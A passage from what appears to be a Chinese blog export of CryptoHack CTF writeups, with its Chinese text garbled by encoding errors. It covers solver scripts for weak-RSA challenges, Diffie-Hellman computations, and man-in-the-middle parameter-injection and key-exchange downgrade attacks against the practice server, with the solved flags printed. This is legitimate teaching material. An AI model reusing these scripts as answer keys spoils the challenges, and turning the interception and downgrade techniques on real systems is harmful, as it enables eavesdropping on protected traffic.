è§£ä½¿ç”¨ http://www.factordb.com/index.php å¾—åˆ°p,q 12p = 19704762736204164635843q = 25889363174021185185929 Monoprimeé¢˜ 1234n = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591 e = 65537ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942 è§£12345678910from Crypto.Util.number import long_to_bytes, inversen = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591e = 65537ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942d = inverse(e, n-1)m = pow(ct, d, n)print(long_to_bytes(m))# b&#x27;crypto&#123;0n3_pr1m3_41n7_pr1m3_l0l&#125;&#x27; Manyprimeé¢˜ è§£å¯ä»¥ä½¿ç”¨sageçš„ecm.factor()å‡½æ•°ï¼š 12345678910111213141516171819from Crypto.Util.number import long_to_bytesfrom sage.all import *n = 580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637e = 65537ct = 320721490534624434149993723527322977960556510750628354856260732098109692581338409999983376131354918370047625150454728718467998870322344980985635149656977787964380651868131740312053755501594999166365821315043312308622388016666802478485476059625888033017198083472976011719998333985531756978678758897472845358167730221506573817798467100023754709109274265835201757369829744113233607359526441007577850111228850004361838028842815813724076511058179239339760639518034583306154826603816927757236549096339501503316601078891287408682099750164720032975016814187899399273719181407940397071512493967454225665490162619270814464factors = ecm.factor(n)phi = prod([f - 1 for f in factors])d = inverse_mod(e, phi)m = pow(ct, d, n)flag = long_to_bytes(m)print(flag.decode())# crypto&#123;700_m4ny_5m4ll_f4c70r5&#125; Saltyé¢˜ 1234567891011121314151617181920212223242526#!/usr/bin/env python3from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytese = 1d = -1while d == -1: p = getPrime(512) q = getPrime(512) phi = (p - 1) * (q - 1) d = inverse(e, phi)n = p * qflag = b&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;pt = bytes_to_long(flag)ct = pow(pt, e, n)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;ct = &#123;ct&#125;&quot;)pt = pow(ct, d, n)decrypted = long_to_bytes(pt)assert decrypted == flag 123n = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767 e = 1ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485 è§£eé€‰çš„æ˜¯1ï¼Œæ ¹æœ¬æ²¡æœ‰èµ·åˆ°ä»»ä½•åŠ å¯†çš„æ•ˆæœã€‚ 1234567from Crypto.Util.number import long_to_bytesn = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767 e = 1ct = 44981230718212183604274785925793145442655465025264554046028251311164494127485flag = long_to_bytes(ct)print(flag)# b&#x27;crypto&#123;saltstack_fell_for_this!&#125;&#x27; Modulus Inutilisé¢˜ 1234567891011121314151617181920212223242526#!/usr/bin/env python3from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytese = 3d = -1while d == -1: p = getPrime(1024) q = getPrime(1024) phi = (p - 1) * (q - 1) d = inverse(e, phi)n = p * qflag = b&quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;pt = bytes_to_long(flag)ct = pow(pt, e, n)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;ct = &#123;ct&#125;&quot;)pt = pow(ct, d, n)decrypted = long_to_bytes(pt)assert decrypted == flag 123n = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883e = 3ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957 è§£eé€‰çš„å¤ªå°äº†ï¼Œä¸”ctä¹Ÿæ¯”nå°å¾ˆå¤šï¼Œæ‰€ä»¥ç›´æ¥å¼€3æ¬¡æ ¹å°±å¥½ã€‚ 123456789from sympy import rootfrom Crypto.Util.number import long_to_bytesn = 17258212916191948536348548470938004244269544560039009244721959293554822498047075403658429865201816363311805874117705688359853941515579440852166618074161313773416434156467811969628473425365608002907061241714688204565170146117869742910273064909154666642642308154422770994836108669814632309362483307560217924183202838588431342622551598499747369771295105890359290073146330677383341121242366368309126850094371525078749496850520075015636716490087482193603562501577348571256210991732071282478547626856068209192987351212490642903450263288650415552403935705444809043563866466823492258216747445926536608548665086042098252335883e = 3ct = 243251053617903760309941844835411292373350655973075480264001352919865180151222189820473358411037759381328642957324889519192337152355302808400638052620580409813222660643570085177957flag = root(ct, e)print(long_to_bytes(flag))# b&#x27;crypto&#123;N33d_m04R_p4dd1ng&#125;&#x27; Working with Fieldsé¢˜ è§£1234p=991g=209print(pow(g,-1,p))# 569 Generators of Groupsé¢˜ è§£è®¾gä¸º$\\mathbb{F}_p$çš„ primitive elementï¼Œåˆ™æœ‰ g^{p-1} \\equiv 1 \\text{ mod }på¹¶ä¸” \\forall k \\leq p-1: g^{k} \\not\\equiv 1 \\text{ mod }på®é™…ä¸Šå› ä¸ºè´¹é©¬å°å®šç†ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½æ»¡è¶³ç¬¬ä¸€ä¸ªç­‰å¼ï¼Œå¹¶ä¸”æ ¹æ®æ‹‰æ ¼æœ—æ—¥å®šç†å¯ä»¥å¾—åˆ°æ‰€æœ‰å…ƒç´ çš„orderéƒ½æ˜¯$p-1$çš„å› æ•°ã€‚æ‰€ä»¥æœ‰ g \\in \\mathbb{F}_p \\text{ is primitive} \\Longleftrightarrow \\forall p_i \\mid p: g^{p_i} \\not\\equiv 1 \\text{ mod }påˆ©ç”¨è¿™ä¸ªåŠæ³•æˆ‘ä»¬å¯ä»¥å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦æ˜¯primitive elementã€‚ 1234567891011121314151617181920from sympy import isprime, factorintdef find_primitive_root(p): assert isprime(p) phi = p - 1 factors = factorint(phi).keys() for g in range(2, p): is_primitive = True for q in factors: if pow(g, phi // q, p) == 1: is_primitive = False break if is_primitive: return gp = 28151primitive = find_primitive_root(p)print(primitive)# 7 Computing Public Valuesé¢˜ è§£123456g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919a=972107443837033796245864316200458246846904598488981605856765890478853088246897345487328491037710219222038930943365848626194109830309179393018216763327572120124760140018038673999837643377590434413866611132403979547150659053897355593394492586978400044375465657296027592948349589216415363722668361328689588996541370097559090335137676411595949335857341797148926151694299575970292809805314431447043469447485957669949989090202320234337890323293401862304986599884732815A=pow(g,a,p)print(A)# 1806857697840726523322586721820911358489420128129248078673933653533930681676181753849411715714173604352323556558783759252661061186320274214883104886050164368129191719707402291577330485499513522368289395359523901406138025022522412429238971591272160519144672389532393673832265070057319485399793101182682177465364396277424717543434017666343807276970864475830391776403957550678362368319776566025118492062196941451265638054400177248572271342548616103967411990437357924 Computing Shared Secretsé¢˜ è§£1234567891011g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919A=70249943217595468278554541264975482909289174351516133994495821400710625291840101960595720462672604202133493023241393916394629829526272643847352371534839862030410331485087487331809285533195024369287293217083414424096866925845838641840923193480821332056735592483730921055532222505605661664236182285229504265881752580410194731633895345823963910901731715743835775619780738974844840425579683385344491015955892106904647602049559477279345982530488299847663103078045601b=12019233252903990344598522535774963020395770409445296724034378433497976840167805970589960962221948290951873387728102115996831454482299243226839490999713763440412177965861508773420532266484619126710566414914227560103715336696193210379850575047730388378348266180934946139100479831339835896583443691529372703954589071507717917136906770122077739814262298488662138085608736103418601750861698417340264213867753834679359191427098195887112064503104510489610448294420720B=518386956790041579928056815914221837599234551655144585133414727838977145777213383018096662516814302583841858901021822273505120728451788412967971809038854090670743265187138208169355155411883063541881209288967735684152473260687799664130956969450297407027926009182761627800181901721840557870828019840218548188487260441829333603432714023447029942863076979487889569452186257333512355724725941390498966546682790608125613166744820307691068563387354936732643569654017172shared_secret = pow(A,b,p)print(shared_secret)# 1174130740413820656533832746034841985877302086316388380165984436672307692443711310285014138545204369495478725102882673427892104539120952393788961051992901649694063179853598311473820341215879965343136351436410522850717408445802043003164658348006577408558693502220285700893404674592567626297571222027902631157072143330043118418467094237965591198440803970726604537807146703763571606861448354607502654664700390453794493176794678917352634029713320615865940720837909466 Deriving Symmetric Keysé¢˜ 1234567891011121314151617181920212223242526from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibimport osfrom secret import shared_secretFLAG = b&#x27;crypto&#123;????????????????????????????&#125;&#x27;def encrypt_flag(shared_secret: int): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Encrypt flag iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(FLAG, 16)) # Prepare data to send data = &#123;&#125; data[&#x27;iv&#x27;] = iv.hex() data[&#x27;encrypted_flag&#x27;] = ciphertext.hex() return dataprint(encrypt_flag(shared_secret)) 1234567891011121314151617181920212223242526272829303132from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)shared_secret = ?iv = ?ciphertext = ?print(decrypt_flag(shared_secret, iv, ciphertext)) è§£1234567891011121314151617181920212223242526272829303132333435363738394041from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919A=112218739139542908880564359534373424013016249772931962692237907571990334483528877513809272625610512061159061737608547288558662879685086684299624481742865016924065000555267977830144740364467977206555914781236397216033805882207640219686011643468275165718132888489024688846101943642459655423609111976363316080620471928236879737944217503462265615774774318986375878440978819238346077908864116156831874695817477772477121232820827728424890845769152726027520772901423784b=197395083814907028991785772714920885908249341925650951555219049411298436217190605190824934787336279228785809783531814507661385111220639329358048196339626065676869119737979175531770768861808581110311903548567424039264485661330995221907803300824165469977099494284722831845653985392791480264712091293580274947132480402319812110462641143884577706335859190668240694680261160210609506891842793868297672619625924001403035676872189455767944077542198064499486164431451944B=1241972460522075344783337556660700537760331108332735677863862813666578639518899293226399921252049655031563612905395145236854443334774555982204857895716383215705498970395379526698761468932147200650513626028263449605755661189525521343142979265044068409405667549241125597387173006460145379759986272191990675988873894208956851773331039747840312455221354589910726982819203421992729738296452820365553759182547255998984882158393688119629609067647494762616719047466973581shared_secret = pow(A,b,p)iv = &quot;737561146ff8194f45290f5766ed6aba&quot;ciphertext = &quot;39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c&quot;print(decrypt_flag(shared_secret, iv, ciphertext))# crypto&#123;sh4r1ng_s3cret5_w1th_fr13nd5&#125; Parameter Injectioné¢˜ è§£æˆ‘ä»¬ä¼šå…ˆæ”¶åˆ°Aliceå‘é€çš„å…¬é’¥ä»¥åŠå‚æ•°ï¼ˆp,g,Aï¼‰ï¼Œå¯ä»¥é€‰æ‹©ä¸è¿›è¡Œä¿®æ”¹å°†å…¶å‘é€ç»™Bobã€‚è€Œåæ”¶åˆ°äº†Bobçš„å…¬é’¥Bä¹‹åæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸ºgå‘é€ç»™Aliceã€‚è¿™æ—¶å¯¹Aæ¥è¯´ï¼Œä»–ä»¬çš„å…±äº«å¯†é’¥ä¸ºï¼š B^a = g^a = Aï¼Œæ˜¯æˆ‘ä»¬å·²çŸ¥çš„ï¼Œæ‰€ä»¥æœ€åç”¨å…¶è§£å¯†æ”¶åˆ°AESåŠ å¯†åçš„ä¿¡æ¯å³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *import jsonfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(p == len(padding) for p in padding)def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)r = remote(&quot;socket.cryptohack.org&quot;, 13371)alice_raw = r.recvline().decode()# print(alice_raw)# Intercepted from Alice: &#123;&quot;p&quot;: &quot;0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff&quot;, &quot;g&quot;: &quot;0x02&quot;, &quot;A&quot;: &quot;0x66dfba3758f569f2e8555b078f0ab97cebee5d95e0952156442dad855a6fa4b83f46706864009e5f4a675ac9805a62c98bfdb11257c093f709e665dedce2b5e2d1fac06abc6f20ee542359062a0cbfef4c34e82d1ca6ed7e005d42d1b1101bf17ee19e1dba12cfbb7cd13b2754c224a0e1200f1c28780ee117b8779be01af187a69bbba2bf7429370775cf34611ff93e90b3851d927ae7c41e4a83866ed5df76edb3c9f36fa5fb955887ccec964a773240d7b24df13f5cc0d9ffcc7fc3c9d19d&quot;&#125;alice_data = json.loads(alice_raw.split(&quot;Intercepted from Alice: &quot;)[1])r.sendafter(b&quot;Send to Bob:&quot;, json.dumps(alice_data).encode())# æ‹¦æˆª Bob çš„æ•°æ®å¹¶ä¿®æ”¹ B=gbob_raw = r.recvline().decode()# print(bob_raw)# Intercepted from Bob: &#123;&quot;B&quot;: &quot;0x4b3506e067f1e4c2cb9a481efe7df6300cc39cfa71e93468afd35d7bdccc95d479f6711672ec1c1c2ca2bc7e69ebc66e548323efebcccb6b6f1cf5e313aecf2b8e31a382481a867fd1f37623ba69224f5d51788df06f4f579f0cc4bc301977ec442332dc370a5e30e701dce36df6cc16b4a9f4f85a39a1ac98431fc3af5726f506f22b7947f2c555af0d2d3135b74ba9d19851c0aac1ab6bc672878edb26a4838593a023ede0074e4e013a33f373406751563cdf6a1a8015345b47d2f4ee67ca&quot;&#125;bob_data = json.loads(bob_raw.split(&quot;Intercepted from Bob: &quot;)[1])bob_data[&#x27;B&#x27;] = alice_data[&#x27;g&#x27;]r.sendafter(b&quot;Send to Alice:&quot;, json.dumps(bob_data).encode())# æ¥æ”¶åŠ å¯†æ•°æ®final_response = r.recvall()# print(final_response)# b&#x27; Intercepted from Alice: &#123;&quot;iv&quot;: &quot;43650888bb6facc1200aa3ddbf103cb4&quot;, &quot;encrypted_flag&quot;: &quot;4d9ec31387929a23395dd382d0b5fc62b377a4daa95f168d17cdd4c2630a5b69&quot;&#125;\\n&#x27;final_data = json.loads(final_response.decode().split(&quot;Intercepted from Alice: &quot;)[1])iv = final_data[&#x27;iv&#x27;]ciphertext = final_data[&#x27;encrypted_flag&#x27;]shared_secret = int(alice_data[&#x27;A&#x27;], 16)print(decrypt_flag(shared_secret, iv, ciphertext))# crypto&#123;n1c3_0n3_m4ll0ry!!!!!!!!&#125; Export-gradeé¢˜ ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’å¤§æ¦‚ä¼šæ”¶åˆ°è¿™äº›å†…å®¹ï¼š 123456789Intercepted from Alice: &#123;&quot;supported&quot;: [&quot;DH1536&quot;, &quot;DH1024&quot;, &quot;DH512&quot;, &quot;DH256&quot;, &quot;DH128&quot;, &quot;DH64&quot;]&#125;Send to Bob:Send to Bob: Intercepted from Bob: &#123;&quot;chosen&quot;: &quot;DH1024&quot;&#125;Send to Alice:Intercepted from Alice: &#123;&quot;p&quot;: &quot;0xde26ab651b92a129&quot;, &quot;g&quot;: &quot;0x2&quot;, &quot;A&quot;: &quot;0xab480cafdb6037a9&quot;&#125;Intercepted from Bob: &#123;&quot;B&quot;: &quot;0x2edc404ff934cbbb&quot;&#125;Intercepted from Alice: &#123;&quot;iv&quot;: &quot;de3c285b773c7f37920800f8292b5604&quot;, &quot;encrypted_flag&quot;: &quot;dfd4221ad3ec8788d6410213adae297b5076179df27885ea0fa9d76ea0748a32&quot;&#125; è§£æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ‹¦æˆªé€‰æ‹©ç®—æ³•çš„é‚£ä¸€æ­¥ï¼Œè®©ä»–ä»¬é€‰æ‹©DH64ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥ç”¨sympyåº“çš„discrete_logè®¡ç®—å‡ºå¯†é’¥ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *import jsonimport refrom hashlib import sha1from Crypto.Cipher import AESfrom sympy import discrete_log# å°†æ¶ˆæ¯ä¸­çš„JSONéƒ¨åˆ†æå–å‡ºæ¥def recv_until_jsons(raw_data: str): json_objects = re.findall(r&#x27;\\&#123;.*?\\&#125;&#x27;, raw_data) parsed = [] for js in json_objects: try: parsed.append(json.loads(js)) except json.JSONDecodeError: continue return parsedr = remote(&quot;socket.cryptohack.org&quot;, 13379)line = r.recvline().decode().strip()json_str = re.search(r&#x27;\\&#123;.*\\&#125;&#x27;, line).group()msg = json.loads(json_str)msg[&#x27;supported&#x27;] = [&quot;DH64&quot;]r.sendline(json.dumps(msg).encode())line = r.recvline().decode().strip()json_str = re.search(r&#x27;\\&#123;.*\\&#125;&#x27;, line).group()r.sendline(json_str.encode())data = r.recvall().decode()params = &#123;&#125;for obj in recv_until_jsons(data): if &#x27;p&#x27; in obj and &#x27;g&#x27; in obj and &#x27;A&#x27; in obj: params[&#x27;p&#x27;] = int(obj[&#x27;p&#x27;], 16) params[&#x27;g&#x27;] = int(obj[&#x27;g&#x27;], 16) params[&#x27;A&#x27;] = int(obj[&#x27;A&#x27;], 16) elif &#x27;B&#x27; in obj: params[&#x27;B&#x27;] = int(obj[&#x27;B&#x27;], 16) elif &#x27;iv&#x27; in obj and &#x27;encrypted_flag&#x27; in obj: params[&#x27;iv&#x27;] = bytes.fromhex(obj[&#x27;iv&#x27;]) params[&#x27;ct&#x27;] = bytes.fromhex(obj[&#x27;encrypted_flag&#x27;])# === è®¡ç®—ç§é’¥ a, å…±äº«å¯†é’¥ s, æ´¾ç”Ÿ AES å¯†é’¥å¹¶è§£å¯† ===p, g, A, B = params[&#x27;p&#x27;], params[&#x27;g&#x27;], params[&#x27;A&#x27;], params[&#x27;B&#x27;]iv, ct = params[&#x27;iv&#x27;], params[&#x27;ct&#x27;]a = discrete_log(p, A, g)s = pow(B, a, p)key = sha1(str(s).encode()).digest()[:16]pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)print(pt.decode())# crypto&#123;d0wn6r4d35_4r3_d4n63r0u5&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"Cyptohack Symmetric_Cryptography Writeup","slug":"CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup","date":"2025-06-02T20:37:53.000Z","updated":"2025-06-02T22:26:06.396Z","comments":true,"path":"2025/06/02/CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup/","permalink":"https://archer-baiyi.github.io/2025/06/02/CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup/","excerpt":"","text":"Keyed Permutationsé¢˜ è§£è¿™ç§å«Bijectionã€‚ 1crypto&#123;bijection&#125; Resisting Bruteforceé¢˜ è§£æ ¹æ®å›¾ç‰‡ä¸­çš„æè¿°ï¼Œé¢˜ç›®è¯¢é—®çš„æ˜¯ï¼šâ€œWhat is the name for the best single-key attack against AES?â€ åœ¨æè¿°ä¸­æåˆ°äº†ï¼š AES çš„å®‰å…¨æ€§ ä¸€ä¸ªæ”»å‡»èƒ½å°† AES-128 çš„å®‰å…¨æ€§é™ä½åˆ°çº¦ 126.1 bits è¿™ç§æ”»å‡»è‡ª 8 å¹´å‰æå‡ºåæœªè§æ”¹è¿› æœ€åæåˆ°äº†é‡å­è®¡ç®—æœºçš„ Grover ç®—æ³•ï¼Œä½†é¢˜ç›®å…³æ³¨çš„æ˜¯å•å¯†é’¥æ”»å‡» ç»“åˆè¿™äº›ä¿¡æ¯ï¼Œè¿™é‡Œçš„å…³é”®æ˜¯ AES æœ€çŸ¥åçš„å•å¯†é’¥æ”»å‡»ï¼šâ€œbiclique attackâ€ã€‚ biclique æ”»å‡»æ˜¯ç›®å‰å¯¹ AES æœ€å¥½çš„å•å¯†é’¥æ”»å‡»ï¼Œè™½ç„¶å®ƒåªé™ä½äº†å®‰å…¨çº§åˆ«å¾ˆå°ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”ä¸æ„æˆç°å®å¨èƒï¼Œä½†åœ¨å­¦æœ¯ç•Œä¸­ï¼Œå®ƒæ˜¯å¯¹ AES çš„å·²çŸ¥æœ€ä½³æ”»å‡»ã€‚ 1crypto&#123;biclique&#125; Structure of AESé¢˜ 12345678910111213141516def bytes2matrix(text): &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix. &quot;&quot;&quot; return [list(text[i:i+4]) for i in range(0, len(text), 4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; ????matrix = [ [99, 114, 121, 112], [116, 111, 123, 105], [110, 109, 97, 116], [114, 105, 120, 125],]print(matrix2bytes(matrix)) è§£1234567891011121314151617def bytes2matrix(text): &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix. &quot;&quot;&quot; return [list(text[i:i+4]) for i in range(0, len(text), 4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))matrix = [ [99, 114, 121, 112], [116, 111, 123, 105], [110, 109, 97, 116], [114, 105, 120, 125],]print(matrix2bytes(matrix))# b&#x27;crypto&#123;inmatrix&#125;&#x27; Round Keysé¢˜ 1234567891011121314151617181920state = [ [206, 243, 61, 34], [171, 11, 93, 31], [16, 200, 91, 108], [150, 3, 194, 51],]round_key = [ [173, 129, 68, 82], [223, 100, 38, 109], [32, 189, 53, 8], [253, 48, 187, 78],]def add_round_key(s, k): ???print(add_round_key(state, round_key)) è§£123456789101112131415161718192021222324state = [ [206, 243, 61, 34], [171, 11, 93, 31], [16, 200, 91, 108], [150, 3, 194, 51],]round_key = [ [173, 129, 68, 82], [223, 100, 38, 109], [32, 189, 53, 8], [253, 48, 187, 78],]def add_round_key(s, k): return [[s[i][j] ^ k[i][j] for j in range(4)] for i in range(4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))print(matrix2bytes(add_round_key(state, round_key)))# b&#x27;crypto&#123;r0undk3y&#125;&#x27; Confusion through Substitutioné¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 